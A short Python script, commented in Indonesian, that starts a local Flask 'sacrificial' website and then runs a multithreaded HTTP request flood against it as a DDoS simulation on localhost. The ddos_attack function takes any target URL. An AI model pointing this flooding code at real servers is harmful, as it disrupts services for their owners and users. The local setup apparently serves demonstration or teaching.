from flask import Flask
import threading
import requests
import time

app = Flask(__name__)

# --- Bagian 1: Website Tumbal ---
@app.route('/')
def home():
    return "<h1>Website Tumbal 🛡️</h1><p>Ini contoh simulasi target DDoS lokal.</p>"

# Jalankan web server di thread terpisah
def run_server():
    app.run(host="127.0.0.1", port=5000)

# --- Bagian 2: Tools DDoS Simulasi ---
def ddos_attack(target, thread_count=10, duration=5):
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                requests.get(target)
                print("Menyerang:", target)
            except:
                pass

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    # Jalankan web server
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    print("Website tumbal aktif di http://127.0.0.1:5000")
    input("Tekan ENTER untuk mulai simulasi DDoS...\n")

    # Simulasi serangan ke localhost
    ddos_attack("http://127.0.0.1:5000", thread_count=20, duration=10)
    print("Simulasi DDoS selesai ✅")